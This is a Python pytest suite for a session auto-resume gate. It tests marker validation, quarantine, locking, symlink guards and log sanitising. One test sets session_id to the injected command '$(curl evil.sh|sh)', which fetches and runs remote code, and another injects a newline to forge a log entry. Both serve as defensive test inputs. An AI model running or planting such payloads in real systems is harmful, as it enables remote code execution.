#!/usr/bin/env python3
"""S67 T1: pytest-сьют для gate-only помощника auto_resume_gate.py.

Изоляция: tmp_path AR_DIR/AR_REPO через monkeypatch env + свежая загрузка модуля
per-test (env читается на import). Зеркалит строгость
kit/hooks/tests/test_state_integrity_security.py: проверяем и stdout-токен,
и побочные эффекты (карантин-файлы, содержимое gate_state.json, symlink-guards,
санитайз лога, fail-safe).
"""

from __future__ import annotations

import importlib.util
import json
import os
import time
from pathlib import Path

GATE_PATH = Path(__file__).resolve().parents[1] / "lib" / "auto_resume_gate.py"


def load_gate(monkeypatch, tmp_path, **env):
    """Свежий экземпляр модуля с изолированным AR_DIR/AR_REPO."""
    ar_dir = tmp_path / "ar"
    repo = tmp_path / "repo"
    state = repo / "llm-wiki" / "wiki" / "project" / "SPRINT_STATE.md"
    state.parent.mkdir(parents=True, exist_ok=True)
    if not state.exists():
        state.write_text("phase: 4-execution\n", encoding="utf-8")
    monkeypatch.setenv("AR_DIR", str(ar_dir))
    monkeypatch.setenv("AR_REPO", str(repo))
    monkeypatch.setenv("AR_MIN_AGE", "300")
    monkeypatch.setenv("AR_MAX_AGE", str(48 * 3600))
    monkeypatch.setenv("AR_NOPROG_MAX", "3")
    for key, val in env.items():
        monkeypatch.setenv(key, str(val))
    spec = importlib.util.spec_from_file_location("auto_resume_gate_under_test", GATE_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def write_marker(mod, age=400, cwd=None, session_id="abcdef1234deadbeef", extra=None):
    """Маркер C1 pending.json в изолированном AR_DIR."""
    mod.AR_DIR.mkdir(parents=True, exist_ok=True)
    marker = {"ts": time.time() - age, "cwd": str(cwd if cwd is not None else mod.AR_REPO)}
    if session_id is not None:
        marker["session_id"] = session_id
    if extra:
        marker.update(extra)
    mod.MARKER.write_text(json.dumps(marker), encoding="utf-8")
    return marker


def run(mod, capsys):
    rc = mod.main()
    out = capsys.readouterr().out.strip()
    return rc, out


def gate_state(mod):
    return json.loads(mod.GATE_STATE.read_text(encoding="utf-8"))


# ── NONE: нет маркера ────────────────────────────────────────────────────────


def test_no_marker_prints_none_and_clears_stale_gate_state(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    mod.AR_DIR.mkdir(parents=True, exist_ok=True)
    mod.GATE_STATE.write_text('{"last_stamp": "old", "attempt": 2, "first_ts": 1}')
    rc, out = run(mod, capsys)
    assert rc == 0
    assert out == "NONE"
    assert not mod.GATE_STATE.exists(), "осиротевший gate_state.json должен сниматься"


# ── STALE: малформный маркер ─────────────────────────────────────────────────


def test_malformed_marker_stale_and_quarantined(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    mod.AR_DIR.mkdir(parents=True, exist_ok=True)
    mod.MARKER.write_text("{not json at all", encoding="utf-8")
    rc, out = run(mod, capsys)
    assert rc == 0
    assert out == "STALE"
    assert not mod.MARKER.exists()
    assert list(mod.AR_DIR.glob("stale-malformed-*.json")), "маркер должен уйти в карантин"


def test_non_dict_json_marker_is_malformed(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    mod.AR_DIR.mkdir(parents=True, exist_ok=True)
    mod.MARKER.write_text("[1, 2, 3]", encoding="utf-8")  # валидный JSON, но не объект
    rc, out = run(mod, capsys)
    assert out == "STALE"
    assert list(mod.AR_DIR.glob("stale-malformed-*.json"))


# ── WAIT: слишком молодой маркер ─────────────────────────────────────────────


def test_young_marker_wait_marker_untouched(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=10)
    rc, out = run(mod, capsys)
    assert rc == 0
    assert out == "WAIT"
    assert mod.MARKER.exists(), "молодой маркер не трогаем"
    assert not mod.GATE_STATE.exists()


# ── FOREIGN: чужой репозиторий ───────────────────────────────────────────────


def test_foreign_cwd_quarantined(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=400, cwd="/some/other/repo")
    rc, out = run(mod, capsys)
    assert out == "FOREIGN"
    assert not mod.MARKER.exists()
    assert list(mod.AR_DIR.glob("foreign-*.json"))


# ── STALE: bad session_id (defensive) ────────────────────────────────────────


def test_bad_session_id_stale_and_quarantined(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=400, session_id="$(curl evil.sh|sh)")
    rc, out = run(mod, capsys)
    assert out == "STALE"
    assert not mod.MARKER.exists()
    assert list(mod.AR_DIR.glob("stale-badsid-*.json"))


def test_missing_session_id_still_go(monkeypatch, tmp_path, capsys):
    """Desktop стартует свою сессию — session_id не обязателен."""
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=400, session_id=None)
    rc, out = run(mod, capsys)
    assert out == "GO"
    assert mod.MARKER.exists(), "маркер снимает возобновлённая сессия, не гейт"


# ── STALE: просроченный маркер ───────────────────────────────────────────────


def test_too_old_marker_stale_and_quarantined(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=49 * 3600)  # > 48h
    rc, out = run(mod, capsys)
    assert out == "STALE"
    assert not mod.MARKER.exists()
    quarantined = [
        p for p in mod.AR_DIR.glob("stale-*.json") if p.name.split("-")[1].split(".")[0].isdigit()
    ]
    assert quarantined, "stale-<ts>.json должен появиться"


# ── GO: первый валидный проход ───────────────────────────────────────────────


def test_first_valid_marker_go_writes_gate_state(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=400)
    before = int(time.time())
    rc, out = run(mod, capsys)
    assert rc == 0
    assert out == "GO"
    assert mod.MARKER.exists()
    gs = gate_state(mod)
    assert gs["attempt"] == 0
    assert gs["last_stamp"] == mod.progress_stamp()
    assert gs["first_ts"] >= before


# ── STALE: no-progress loop через sidecar ────────────────────────────────────


def test_same_stamp_reaches_noprog_max_stale(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=400)
    _, out1 = run(mod, capsys)
    assert out1 == "GO"
    first_ts = gate_state(mod)["first_ts"]
    _, out2 = run(mod, capsys)
    assert out2 == "GO"
    gs2 = gate_state(mod)
    assert gs2["attempt"] == 1
    assert gs2["first_ts"] == first_ts, "first_ts сохраняется между попытками"
    _, out3 = run(mod, capsys)
    assert out3 == "GO"
    assert gate_state(mod)["attempt"] == 2
    _, out4 = run(mod, capsys)  # attempt=3 >= AR_NOPROG_MAX=3 → STALE
    assert out4 == "STALE"
    assert not mod.MARKER.exists()
    assert list(mod.AR_DIR.glob("stale-noprogress-*.json"))
    assert not mod.GATE_STATE.exists(), "gate_state снимается вместе с карантином"


def test_changed_stamp_resets_attempt(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=400)
    run(mod, capsys)  # GO attempt=0
    _, out2 = run(mod, capsys)  # GO attempt=1
    assert out2 == "GO"
    assert gate_state(mod)["attempt"] == 1
    state = mod.AR_REPO / "llm-wiki" / "wiki" / "project" / "SPRINT_STATE.md"
    state.write_text("phase: 5-verify\n", encoding="utf-8")  # прогресс → stamp меняется
    _, out3 = run(mod, capsys)
    assert out3 == "GO"
    gs = gate_state(mod)
    assert gs["attempt"] == 0, "смена stamp сбрасывает счётчик"
    assert gs["last_stamp"] == mod.progress_stamp()


# ── STALE: first_ts — абсолютный потолок кампании (C-B) ──────────────────────


def test_first_ts_ceiling_stale_even_when_stamp_keeps_changing(monkeypatch, tmp_path, capsys):
    """Thrashing: ts маркера свежий, stamp меняется (attempt сбрасывается) —
    но кампания старше AR_MAX_AGE по first_ts → STALE, не бесконечные GO."""
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=400)
    _, out1 = run(mod, capsys)
    assert out1 == "GO"
    gs = gate_state(mod)
    gs["first_ts"] = int(time.time()) - 49 * 3600  # кампания «началась» 49ч назад
    mod._write_gate_state(gs)
    state = mod.AR_REPO / "llm-wiki" / "wiki" / "project" / "SPRINT_STATE.md"
    state.write_text("phase: 5-verify\n", encoding="utf-8")  # прогресс: stamp меняется
    _, out2 = run(mod, capsys)
    assert out2 == "STALE"
    assert not mod.MARKER.exists()
    assert list(mod.AR_DIR.glob("stale-timeout-*.json")), "карантин stale-timeout-<now>.json"
    assert not mod.GATE_STATE.exists(), "sidecar снимается вместе с карантином"


def test_first_ts_preserved_across_stamp_change_within_ceiling(monkeypatch, tmp_path, capsys):
    """Смена stamp сбрасывает attempt, но НЕ first_ts — иначе потолок обходим."""
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=400)
    _, out1 = run(mod, capsys)  # первый GO — кампания начинается, first_ts фиксируется
    assert out1 == "GO"
    first_ts = gate_state(mod)["first_ts"]
    state = mod.AR_REPO / "llm-wiki" / "wiki" / "project" / "SPRINT_STATE.md"
    state.write_text("phase: 5-verify\n", encoding="utf-8")  # прогресс → stamp меняется
    _, out2 = run(mod, capsys)
    assert out2 == "GO"
    gs = gate_state(mod)
    assert gs["attempt"] == 0, "attempt сбрасывается на прогрессе"
    assert gs["first_ts"] == first_ts, "first_ts НЕ сбрасывается при смене stamp"


# ── NONE-path clear под lock (LOW) ───────────────────────────────────────────


def test_none_path_skips_clear_when_lock_held(monkeypatch, tmp_path, capsys):
    """Чужой свежий lock → сироту не трогаем (гонка с os.replace тика), но NONE."""
    mod = load_gate(monkeypatch, tmp_path)
    mod.AR_DIR.mkdir(parents=True, exist_ok=True)
    mod.GATE_STATE.write_text('{"last_stamp": "x", "attempt": 1, "first_ts": 1}')
    mod.LOCK.mkdir(parents=True)
    rc, out = run(mod, capsys)
    assert rc == 0
    assert out == "NONE"
    assert mod.GATE_STATE.exists(), "под чужим lock сироту не снимаем"
    assert mod.LOCK.exists(), "чужой lock не снимается NONE-путём"


# ── Lock: два тика не гоняются ───────────────────────────────────────────────


def test_lock_contention_wait(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=400)
    mod.LOCK.mkdir(parents=True)  # свежий чужой lock
    rc, out = run(mod, capsys)
    assert out == "WAIT"
    assert mod.MARKER.exists()
    assert not mod.GATE_STATE.exists()


def test_orphaned_lock_reclaimed_after_2h(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=400)
    mod.LOCK.mkdir(parents=True)
    old = time.time() - 3 * 3600
    os.utime(mod.LOCK, (old, old))
    rc, out = run(mod, capsys)
    assert out == "GO", "сиротский lock >2ч снимается"


# ── Security carryover: symlink-guards + санитайз лога ───────────────────────


def test_log_symlink_not_followed(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    mod.AR_DIR.mkdir(parents=True, exist_ok=True)
    target = tmp_path / "LOG_TARGET"
    target.write_text("ORIGINAL\n", encoding="utf-8")
    os.symlink(target, mod.LOG)  # AR_DIR/log — симлинк наружу
    mod.MARKER.write_text("{broken", encoding="utf-8")  # форсируем log()
    rc, out = run(mod, capsys)
    assert out == "STALE"
    assert target.read_text(encoding="utf-8") == "ORIGINAL\n", "symlink-лог не разыменовывается"


def test_gate_state_symlink_not_followed(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=400)
    target = tmp_path / "STATE_TARGET"
    target.write_text("ORIGINAL\n", encoding="utf-8")
    os.symlink(target, mod.GATE_STATE)  # gate_state.json — симлинк наружу
    rc, out = run(mod, capsys)
    assert out == "GO"
    assert target.read_text(encoding="utf-8") == "ORIGINAL\n", "запись не ушла сквозь симлинк"
    assert not mod.GATE_STATE.is_symlink(), "atomic replace ставит обычный файл"
    assert gate_state(mod)["attempt"] == 0


def test_log_control_chars_sanitized(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    write_marker(mod, age=400, cwd="/evil\nINJECTED fake-log-line")
    rc, out = run(mod, capsys)
    assert out == "FOREIGN"
    log_text = mod.LOG.read_text(encoding="utf-8")
    assert "\nINJECTED" not in log_text, "newline-инъекция в лог должна гаситься"
    assert "?INJECTED" in log_text


# ── Fail-safe: гейт никогда не роняет desktop-тик ────────────────────────────


def test_unreadable_marker_failsafe_none(monkeypatch, tmp_path, capsys):
    mod = load_gate(monkeypatch, tmp_path)
    mod.AR_DIR.mkdir(parents=True, exist_ok=True)
    mod.MARKER.mkdir()  # pending.json — каталог: OSError вне malformed-ветки
    rc, out = run(mod, capsys)
    assert rc == 0
    assert out == "NONE"
